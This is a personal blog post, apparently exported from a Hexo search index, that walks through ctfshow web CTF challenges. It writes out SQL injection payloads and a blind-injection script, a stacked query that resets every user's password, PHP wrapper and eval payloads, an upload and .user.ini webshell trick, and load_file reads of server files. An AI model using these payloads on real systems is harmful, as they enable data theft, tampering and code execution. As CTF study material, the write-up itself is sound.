<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ctfshow练习</title>
    <url>/2024/02/27/ctfshow%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304072204882.png" alt="image-20230407220424812"></p>
<p>base64</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>是sql注入，但是没有回显，搞得挺恶心的，上sqlmap不知道为啥跑不出来</p>
<p>这个报错是没有一点显示的，搞得最开始我都没弄清单双引号</p>
<p>但本质上还是个简单的sql注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; or 1=1 #&amp;password=a</span><br></pre></td></tr></table></figure>

<p>有显示</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304072227003.png" alt="image-20230407222706982"></p>
<p>order by 查到是3，联合注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; union select 1,database(),3#&amp;password=a</span><br></pre></td></tr></table></figure>

<p>要注意的是，这里的回显位是2，必须把要查的东西放在第二位</p>
<p>显示<code>web2</code></p>
<p>爆库爆表爆值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;web2&quot;#&amp;password=a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;flag&quot;#&amp;password=a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; union select 1,group_concat(flag),3 from web2.flag#&amp;password=a</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>有提示</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304121531657.png" alt="image-20230412153140585"></p>
<p>那就是伪协议文件包含了，而且没有什么过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=data://text/plain,&lt;?=`cat ctf_go_go_go`;?&gt;</span><br></pre></td></tr></table></figure>

<p>显示出flag</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php include($_GET[&#x27;url&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>文件包含考虑php伪协议，但是传值之后发现error报错，看了wp才知道又是日志包含</p>
<p>（看了一眼过滤php和data）</p>
<p>改个UA再发包，写个一句话木马连蚁剑</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($v1) &amp;&amp; isset($v2))&#123;</span><br><span class="line">            if(!ctype_alpha($v1))&#123;</span><br><span class="line">                die(&quot;v1 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(!is_numeric($v2))&#123;</span><br><span class="line">                die(&quot;v2 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(md5($v1)==md5($v2))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>ctype_alpha()判断是否全字母，is_numeric()判断是否全数字，简单的md5绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708</span><br></pre></td></tr></table></figure>

<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>唉，没有一点提示，过滤了or和空格。还把报错关了。试了一下才知道有三列，回显位在2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure>

<p>然后就是最傻逼的拼命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;web2&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,group_concat(flag),3/**/from/**/web2.flag#</span><br></pre></td></tr></table></figure>

<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>一样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,2,3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,database(),group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,database(),group_concat(flag)/**/from/**/web.flag#</span><br></pre></td></tr></table></figure>

<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>用<code>-1/**/or/**/1=1/**/order/**/by/**/3</code>测出来有三段</p>
<p>但是禁用了union关键字，那就只能用盲注了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://e3406b2c-d1a2-4d95-9939-2b3b5e00d525.challenge.ctf.show/&#x27;</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 80):</span><br><span class="line">    for j in range(32, 128):</span><br><span class="line">        payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot; % (</span><br><span class="line">        str(i), str(j))</span><br><span class="line">        test = s.get(url = url + &#x27;?id=0/**/or/**/&#x27; + payload).text</span><br><span class="line">        if &#x27;I asked nothing&#x27; in test:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot; % (</span><br><span class="line">        str(i), str(j))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br></pre></td></tr></table></figure>

<p>唉，phpmyadmin真是傻逼，乱切换数据库。跑测试的时候弄了好久，还得是Navicat</p>
<p>NP，启动！</p>
<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>呃呃，脑残是不。啥提示没有，试了个<code>ffifdyop</code>给我弹flag了，也不提示我md5</p>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>点击取消弹出来个index.phps，打开查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里直接用的strlen来判断，那么双写就绕过不了了。还把union select禁用了，那quine注入也用不了</p>
<p>本来是想着使用堆叠注入。在后面堆叠插入一条新的数据。但由于使用的是mysqli_query函数，更没法堆叠注入。<code>堆叠注入要求使用mysqli_multi_query函数</code>，只有这个函数能一次性执行多条语句</p>
<p>看似是没什么思路了，看了一下别人的wp才知道还有一种方法也能构造出多一条数据</p>
<blockquote>
<p>GROUP BY 会根据每条password的值进行判断。如果结合SUM等函数，就可以做到让password相同的值所对应的其他列内容进行SUM等操作</p>
<p>至于 WITH ROLLUP，它是一种用于在 GROUP BY 子句中添加汇总行的选项。它会在结果中添加一个额外的行，该行包含了所有分组的聚合结果。同上，如果进行了SUM操作，就会把所有的值都SUM起来</p>
</blockquote>
<p>例:</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309220951780.png" alt="image-20230922095013228"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `password`,SUM(`username`) FROM users GROUP BY `password`</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309220957193.png" alt="image-20230922095727165"></p>
<p>而如果加上rollup，就会多处一列，再次进行SUM的汇总操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309220958495.png" alt="image-20230922095822472"></p>
<p>而此时，password这一栏会显示NULL</p>
<p>这个题就是利用了这个点，产生了一条password&#x3D;Null的数据。而这时在POST中传入null就可echo出flag</p>
<blockquote>
<p>再补充一下堆叠注入的办法吧，虽然在这题用不了，但谁知道以后呢。只适用于mysqli_multi_query</p>
<p>使用多条sql语句，并用;分割执行。本质上是堆叠+二次注入</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;1;;INSERT INTO `user`.`users` (`password`, `username`) VALUES (&#x27;test&#x27;, &#x27;test&#x27;);;UPDATE users SET password = &#x27;done&#x27;;UPDATE users SET username = &#x27;done&#x27;;</span><br></pre></td></tr></table></figure>

<p>这样一来就把所有的用户名和对应的密码都设置为done了</p>
</blockquote>
<h2 id="wb11"><a href="#wb11" class="headerlink" title="wb11"></a>wb11</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这题也是出的云里雾里的，跟数据库一点关系没有</p>
<p>$password实际上是get传参进来的，和session[‘password’]进行比较</p>
<p>如果两个都为空即可绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309221311017.png" alt="image-20230922131119973"></p>
<p>删掉password的赋值和Cookie</p>
<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>F12给出hit:?cmd&#x3D;</p>
<p>尝试多次之后发现传入phpinfo();可以成功回显，思路就是直接查文件。但是一看phpinfo里能用的函数基本全给我ban了，直接用命令的方法也不会是很ok</p>
<p>这时候就要想到php原生类了。结合我之前做的笔记，直接Globlterator+SplFileObject开查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=$context = new SplFileObject(&#x27;/var/www/html/903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#x27;);foreach($context as $f)&#123;</span><br><span class="line">echo($f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>唉，看了别的师傅wp，还有更简单的函数highlight_file，直接秒了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h2><p>给cmd随便穿了个东西就弹出源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">            $cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">            if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123;</span><br><span class="line">            </span><br><span class="line">                die(&quot;cerror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(preg_match(&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;,$cmd))&#123;</span><br><span class="line">                die(&quot;serror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            eval($cmd);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">     ?&gt;</span><br></pre></td></tr></table></figure>

<p>可见，能用的有 p &#x3D; + ; . ? &lt; &gt; &#96; \</p>
<p>想不明白直接找资料</p>
<blockquote>
<p>php的上传接受multipart&#x2F;form-data，然后会将它保存在临时文件中。php.ini中设置的<code>upload_tmp_dir</code>就是这个临时文件的保存目录。linux下默认为<code>/tmp</code>。也就是说，只要是php接收到上传的POST请求，就会保存一个临时文件，如何这个php脚本具有“上传功能”那么它将拷贝走，无论如何当脚本执行结束这个临时文件都会被删除。另外，这个php临时文件在linux系统下的命名规则永远是<code>phpXXXXXX</code></p>
</blockquote>
<p>基本思路就是上传，然后用eval+&#96;+?+.去模糊匹配执行（.&#x3D;source，source一个文件相当于把每行的命令依次执行一次）</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309222041842.png" alt="image-20230922204150800"></p>
<p>那就是要先完成文件上传，直接让chatgpt给就行</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>文件上传示例<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileInput&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;.jpg, .jpeg, .png, .gif&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;uploadFile()&quot;</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;response&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">uploadFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> responseDiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;response&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (fileInput.<span class="property">files</span>.<span class="property">length</span> === <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&#x27;请选择一个文件&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> file = fileInput.<span class="property">files</span>[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span></span><br><span class="line"><span class="language-javascript">        formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span>, file);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://your-upload-url.com&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: formData</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件上传失败&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这时候直接向&#x2F;index.php?cmd&#x3D;?&gt;&lt;?&#x3D;`.+&#x2F;??p&#x2F;p?p??????`;上传test.txt，内容是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /bin/bash</span><br><span class="line">cat /flag.txt</span><br></pre></td></tr></table></figure>

<p>就可以弹出flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309222118039.png" alt="image-20230922211835007"></p>
<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>唉，也是脑残。源码在upload.php.bak</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">	$filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];</span><br><span class="line">	$temp_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">	$size = $_FILES[&#x27;file&#x27;][&#x27;size&#x27;];</span><br><span class="line">	$error = $_FILES[&#x27;file&#x27;][&#x27;error&#x27;];</span><br><span class="line">	$arr = pathinfo($filename);</span><br><span class="line">	$ext_suffix = $arr[&#x27;extension&#x27;];</span><br><span class="line">	if ($size &gt; 24)&#123;</span><br><span class="line">		die(&quot;error file zise&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if (strlen($filename)&gt;9)&#123;</span><br><span class="line">		die(&quot;error file name&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if(strlen($ext_suffix)&gt;3)&#123;</span><br><span class="line">		die(&quot;error suffix&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if(preg_match(&quot;/php/i&quot;,$ext_suffix))&#123;</span><br><span class="line">		die(&quot;error suffix&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/php/i&quot;),$filename))&#123;</span><br><span class="line">        die(&quot;error file name&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">	if (move_uploaded_file($temp_name, &#x27;./&#x27;.$filename))&#123;</span><br><span class="line">		echo &quot;文件上传成功！&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;文件上传失败！&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>要求文件名中没有php而且后缀名小于等于3</p>
<p>那基本所有能直接使用的php页面都传不上去了</p>
<p>而且要文件大小&lt;&#x3D;24，那就只能这么写了<code>&lt;?php eval($_POST[&#39;a&#39;]);</code></p>
<p>又不能上传.htaccess来解析绕过</p>
<blockquote>
<p>对于php中的.user.ini有如下解释：</p>
<p>PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.user.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。<br>我们在.user.ini中输入<code>auto_prepend_file =a.txt</code>，这样在该目录下的所有文件都会包含a.txt的内容</p>
</blockquote>
<blockquote>
<p><a href="https://www.php.net/manual/zh/ini.core.php#ini.user-ini.cache-ttl">user_ini.cache_ttl</a> 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>
</blockquote>
<p>所以上传之后要等一会才能重新发</p>
<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = intval($_GET[&#x27;c&#x27;]);</span><br><span class="line">    sleep($c);</span><br><span class="line">    switch ($c) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            echo &#x27;$url&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 555555:</span><br><span class="line">            echo $url;</span><br><span class="line">        case 44444:</span><br><span class="line">            echo &quot;@A@&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case 3333:</span><br><span class="line">            echo $url;</span><br><span class="line">            break;</span><br><span class="line">        case 222:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 222:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 3333:</span><br><span class="line">            echo $url;</span><br><span class="line">            break;</span><br><span class="line">        case 44444:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">        case 555555:</span><br><span class="line">            echo $url;</span><br><span class="line">            break;</span><br><span class="line">        case 3:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">        case 6000000:</span><br><span class="line">            echo &quot;$url&quot;;</span><br><span class="line">        case 1:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>都忘了，如果switch case不加break会一直顺序执行，所以传了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=3</span><br></pre></td></tr></table></figure>

<p>之后就会一直执行到echo “$url”;</p>
<p>进入下一个网页F12有提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/information_schema\.tables|information_schema\.columns|linestring| |polygon/is&#x27;, $_GET[&#x27;query&#x27;]))&#123;</span><br><span class="line">		die(&#x27;@A@&#x27;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>试了一下发现是int注入，直接order by查只有一列，当前数据库为web。而且ban了information_schema.tables。</p>
<blockquote>
<p>可以用`information_schema`.`tables`代替information_schema.tables</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/group_concat(table_name)/**/from/**/`information_schema`.`tables`/**/where/**/`table_schema`=&#x27;web&#x27;%23</span><br><span class="line">=&gt;alert(&#x27;content&#x27;)</span><br><span class="line"></span><br><span class="line">?query=-1/**/union/**/select/**/group_concat(column_name)/**/from/**/`information_schema`.`columns`/**/where/**/`table_name`=&#x27;content&#x27;%23</span><br><span class="line">=&gt;alert(&#x27;id,username,password&#x27;)</span><br><span class="line"></span><br><span class="line">?query=-1/**/union/**/select/**/group_concat(id,&#x27;;&#x27;,username,&#x27;;&#x27;,password)/**/from/**/content%23</span><br><span class="line">=&gt;alert(&#x27;1;admin;flag is not here!,2;gtf1y;wow,you can really dance,3;Wow;tell you a secret,secret has a secret...&#x27;)</span><br></pre></td></tr></table></figure>

<p>好吧，并没有flag，那就直接试一下load_file读取本地文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/load_file(&quot;/var/www/html/secret.php&quot;)%23</span><br><span class="line">=&gt;alert(&#x27;&lt;!-- ReadMe --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;here_1s_your_f1ag.php&#x27;;</span><br><span class="line">$file = &#x27;/tmp/gtf1y&#x27;;</span><br><span class="line">if(trim(@file_get_contents($file)) === &#x27;ctf.show&#x27;)&#123;</span><br><span class="line">	echo file_get_contents(&#x27;/real_flag_is_here&#x27;);</span><br><span class="line">&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>看一下代码可以再读一下&#x2F;real_flag_is_here</p>
